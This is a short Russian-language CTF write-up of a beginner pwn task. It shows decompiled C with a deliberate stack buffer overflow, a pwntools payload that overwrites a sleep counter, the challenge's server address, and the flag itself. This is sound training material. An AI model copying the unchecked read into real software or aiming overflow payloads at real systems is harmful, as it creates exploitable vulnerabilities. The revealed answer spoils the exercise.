[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn1_sleep)
Описание:
Вы получите флаг через 1024 секунд, осталось чуть чуть подождать.  
[task](https://pwn.spbctf.ru/files/overflow/sleep/task)
nc 109.233.56.90 11576

Необходимо переполнить буфер и переписать значение seconds на 0.
``` C
void __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[268]; // [rsp+0h] [rbp-110h] BYREF
  unsigned int seconds; // [rsp+10Ch] [rbp-4h]

  alarm(5u);
  seconds = 1024;
  printf("Enter your name: ");
  read(0, buf, 0x400u);
  printf("Hello %s! You will get your flag in %d seconds\n", buf, seconds);
  sleep(seconds);
  system("cat /flag");
}
```

Эксплоит:
``` python
io = start()

io.recvuntil('name: ')
payload = b'A' * 268 + p32(0)
io.sendline(payload)

io.interactive()
```

Запуск:
![{E16EE162-0FA7-4405-86B4-ABB77B1D4433}](../../../../z.%20Images/{E16EE162-0FA7-4405-86B4-ABB77B1D4433}.png)

Ответ: `spbctf{beep_boop_overflow_int_variable}`